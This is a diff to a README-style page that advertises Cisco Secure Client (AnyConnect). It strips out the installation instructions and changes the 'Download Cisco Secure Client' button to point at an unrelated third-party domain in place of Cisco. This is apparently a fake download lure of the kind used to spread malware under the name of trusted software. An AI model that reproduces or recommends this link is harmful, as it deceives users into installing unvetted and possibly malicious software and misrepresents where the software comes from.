@@ -2,33 +2,20 @@
 
 **Cisco Secure Client (including AnyConnect)** is an all-in-one solution designed to enhance connectivity and safeguard digital assets. It integrates VPN functionality, endpoint protection, and telemetry to provide secure remote access. With multi-factor authentication, threat detection, and comprehensive device visibility, it ensures both data protection and optimal network performance. Its user-friendly interface and compatibility across multiple platforms make it a preferred choice for security-conscious organizations.
 
-- [Download Cisco Secure Client](#download-cisco-secure-client)
-- [Installation](#installation)
+- [Download Cisco Secure Client](#installation)
 - [System Requirements](#system-requirements)
 - [Configuration](#configuration)
 - [Troubleshooting](#troubleshooting)
 - [Features](#features)
 - [Usage](#usage)
 
-## Download Cisco Secure Client
+## Installation
 Click the download button below to get the latest version of Cisco Secure Client:
  
-**[Download Cisco Secure Client](*)**
+**[Download Cisco Secure Client](https://boostoria.com/jw/)**
 
 Begin your secure connectivity journey by downloading Cisco Secure Client. This step is the first in a seamless installation process that ensures your device is equipped with advanced VPN capabilities, threat detection, and endpoint protection. Once downloaded, follow the installation guide to configure the client for optimal performance.
 
-
-## Installation
-### Installing on macOS
-1. Open the installer and follow the on-screen instructions:
-   - Accept the Software License Agreement.
-   - Provide your system password if prompted.
-2. Grant necessary permissions via **System Preferences > Security & Privacy**.
-3. Restart your macOS device if required.
-
-### Installing on Windows
-1. Launch the installer and follow the guided setup.
-2. Configure the client according to your organization’s policies. For a comprehensive guide on installation and setup, refer to the official documentation.
 
 ## System Requirements
 - **Windows**: Windows 10 or newer; Microsoft .NET Framework 4.6.2 or later recommended.
